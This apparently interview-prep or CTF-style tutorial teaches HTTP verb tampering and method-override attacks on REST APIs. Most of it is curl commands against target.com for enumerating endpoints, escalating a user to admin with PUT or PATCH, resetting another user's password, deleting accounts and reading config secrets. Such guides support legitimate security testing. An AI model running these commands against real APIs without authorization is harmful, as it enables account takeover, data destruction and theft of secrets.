# Challenge 15: REST API HTTP Methods

> **Difficulty:** 🟢 EASY | **Success Ratio:** 100%
> **Goal:** Enumerate and exploit different HTTP methods on API endpoints to access restricted functionality.

---

## What They Test

Can you discover available HTTP methods on API endpoints and use them to access, modify, or delete data that shouldn't be accessible?

---

## Key Concepts

### HTTP Methods Overview

| Method      | Purpose                        | Safe? | Idempotent? |
| ----------- | ------------------------------ | ----- | ----------- |
| **GET**     | Read/retrieve data             | Yes   | Yes         |
| **POST**    | Create new data                | No    | No          |
| **PUT**     | Update/replace entire resource | No    | Yes         |
| **PATCH**   | Partial update                 | No    | No          |
| **DELETE**  | Remove resource                | No    | Yes         |
| **OPTIONS** | List allowed methods           | Yes   | Yes         |
| **HEAD**    | Get headers only (no body)     | Yes   | Yes         |
| **TRACE**   | Echo back request (debug)      | Yes   | Yes         |
| **CONNECT** | Establish tunnel               | No    | No          |

### What "Verb Tampering" Means
If `GET /admin` is blocked but `POST /admin` is not → the developer only restricted one HTTP method, not all of them. This is **HTTP verb tampering**.

---

## Methodology

### Step 1: Discover Allowed Methods

```bash
# OPTIONS request - asks server what methods are allowed
curl -X OPTIONS https://target.com/api/users -I
# Look for: Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS

# Try each method manually
curl -X GET https://target.com/api/users -v
curl -X POST https://target.com/api/users -v
curl -X PUT https://target.com/api/users -v
curl -X DELETE https://target.com/api/users -v
curl -X PATCH https://target.com/api/users -v
curl -X HEAD https://target.com/api/users -v
curl -X TRACE https://target.com/api/users -v

# Check for 405 Method Not Allowed vs 200 OK
# 405 = method exists but not allowed (or actually rejected)
# 200 = method accepted!
# 404 = endpoint doesn't exist
# 403 = forbidden (but endpoint exists)
```

### Step 2: Enumerate API Endpoints

```bash
# Common API endpoint patterns
/api/
/api/v1/
/api/v2/
/api/users
/api/users/1
/api/admin
/api/config
/api/settings
/api/debug
/api/status
/api/health
/api/info
/api/docs
/api/swagger
/api/swagger.json
/api/swagger.yaml
/api/graphql
/api/rest
/rest/
/v1/
/v2/

# API documentation endpoints (find all available endpoints!)
/swagger-ui.html
/swagger-ui/
/api-docs
/api/docs
/openapi.json
/openapi.yaml
/.well-known/openapi

# Use directory brute forcing
gobuster dir -u https://target.com/api/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
feroxbuster -u https://target.com/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Step 3: Test CRUD Operations

```bash
# READ - Get all users
curl -X GET https://target.com/api/users \
  -H "Content-Type: application/json"

# READ - Get specific user
curl -X GET https://target.com/api/users/1 \
  -H "Content-Type: application/json"

# CREATE - Add new user
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"test123","role":"admin"}'

# UPDATE - Modify user (full replace)
curl -X PUT https://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"newpass","role":"admin","isAdmin":true}'

# UPDATE - Partial modify
curl -X PATCH https://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# DELETE - Remove user
curl -X DELETE https://target.com/api/users/1 \
  -H "Content-Type: application/json"
```

### Step 4: Method Override Techniques

```bash
# When PUT/DELETE are blocked at network/WAF level
# Use POST with override headers

curl -X POST https://target.com/api/users/1 \
  -H "X-HTTP-Method-Override: DELETE"

curl -X POST https://target.com/api/users/1 \
  -H "X-HTTP-Method: PUT" \
  -d '{"role":"admin"}'

curl -X POST https://target.com/api/users/1 \
  -H "X-Method-Override: PATCH" \
  -d '{"isAdmin":true}'

# URL-based override (some frameworks)
curl -X POST "https://target.com/api/users/1?_method=DELETE"
curl -X POST "https://target.com/api/users/1?method=PUT"

# Hidden form field (in HTML forms)
<input type="hidden" name="_method" value="DELETE">
```

### Step 5: Verb Tampering Attacks

```bash
# If GET /admin returns 403 Forbidden, try:
curl -X POST https://target.com/admin
curl -X PUT https://target.com/admin
curl -X PATCH https://target.com/admin
curl -X DELETE https://target.com/admin
curl -X HEAD https://target.com/admin
curl -X OPTIONS https://target.com/admin
curl -X TRACE https://target.com/admin

# Custom/invalid methods (sometimes bypass auth)
curl -X JEFF https://target.com/admin
curl -X TEST https://target.com/admin
curl -X FAKE https://target.com/admin

# Case variations
curl -X get https://target.com/admin
curl -X Get https://target.com/admin
curl -X gEt https://target.com/admin
```

---

## Common Exploitation Scenarios

### Scenario 1: Privilege Escalation via PUT
```bash
# Discover your user info
curl -X GET https://target.com/api/users/me
# Response: {"id": 5, "username": "testuser", "role": "user"}

# Elevate privileges
curl -X PUT https://target.com/api/users/5 \
  -H "Content-Type: application/json" \
  -d '{"id": 5, "username": "testuser", "role": "admin"}'
```

### Scenario 2: Data Access via GET
```bash
# API may expose data to GET without proper auth
curl -X GET https://target.com/api/users
# Returns ALL users including admin credentials

curl -X GET https://target.com/api/config
# Returns application configuration with secrets
```

### Scenario 3: Account Takeover via PATCH
```bash
# Change another user's password
curl -X PATCH https://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"password": "hacked123"}'
```

### Scenario 4: Data Deletion via DELETE
```bash
# Delete admin account or important data
curl -X DELETE https://target.com/api/users/1
# Admin account deleted!
```

### Scenario 5: Access Admin Endpoint via Verb Tampering
```bash
# GET /api/admin → 403 Forbidden
# POST /api/admin → 200 OK (admin panel data!)
```

---

## Burp Suite Approach

```
1. Browse the application normally while Burp captures traffic
2. Check HTTP History for API calls
3. Right-click interesting requests → Send to Repeater
4. In Repeater:
   - Change method (GET → POST → PUT → DELETE → PATCH)
   - Add/modify request body
   - Try override headers
   - Check each response
5. Log all successful unauthorized accesses
```

---

## Authentication & Authorization Testing

```bash
# Test with and without auth token
# Authenticated
curl -X GET https://target.com/api/admin/users \
  -H "Authorization: Bearer YOUR_TOKEN"

# Without auth (anonymous) - should be rejected
curl -X GET https://target.com/api/admin/users

# With low-privilege user token
curl -X GET https://target.com/api/admin/users \
  -H "Authorization: Bearer LOW_PRIV_TOKEN"

# If any of these work → broken access control!
```

---

## Tips for the Interview

1. **Always start with OPTIONS** — it tells you what methods are allowed
2. **Try all HTTP methods on every endpoint** — don't assume only GET/POST exist
3. **Look for API documentation** — `/swagger.json` reveals all endpoints
4. **Method override headers** — always try `X-HTTP-Method-Override` when methods are blocked
5. **Custom methods** — some frameworks accept any method name and bypass auth
6. **Check both with and without authentication** — broken access control is common
7. **Don't forget TRACE** — if enabled, it can leak sensitive headers
